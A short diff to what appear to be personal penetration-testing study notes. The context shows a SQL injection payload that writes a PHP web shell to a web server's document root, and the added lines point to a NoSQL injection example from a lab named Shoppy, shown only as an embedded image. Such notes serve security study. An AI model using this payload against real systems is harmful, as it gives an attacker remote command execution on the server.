@@ -182,3 +182,6 @@ In previous context, we can write something like below to output a shell.php to 
 ```
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
+
+Note: Below is an example taken from the lab, Shoppy, where one attempts to do NoSQL Injection:
+![[Pasted image 20260918182744.png]]
